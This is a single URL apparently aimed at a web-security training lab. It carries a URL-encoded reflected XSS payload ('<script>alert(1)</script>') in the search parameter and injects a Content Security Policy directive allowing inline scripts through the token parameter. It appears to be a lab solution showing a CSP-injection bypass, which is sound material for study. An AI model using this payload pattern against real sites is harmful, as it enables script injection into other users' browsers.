https://acee1feb1f5b0d81c09e19f700e100ca.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```
